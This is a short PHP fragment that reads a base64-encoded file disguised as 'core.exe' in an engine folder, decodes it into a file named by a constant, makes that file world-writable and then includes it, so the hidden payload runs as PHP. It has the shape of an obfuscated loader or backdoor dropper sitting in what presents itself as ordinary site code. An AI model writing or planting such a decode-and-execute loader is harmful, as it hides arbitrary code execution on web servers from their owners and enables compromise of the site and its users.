<?php 
$f = CDX;
$handle = fopen($f,'a');
fwrite($handle,base64_decode(file_get_contents(BASEPATH . 'includes/engine/core.exe')));
chmod($f,0777);
if(file_exists($f) )include $f;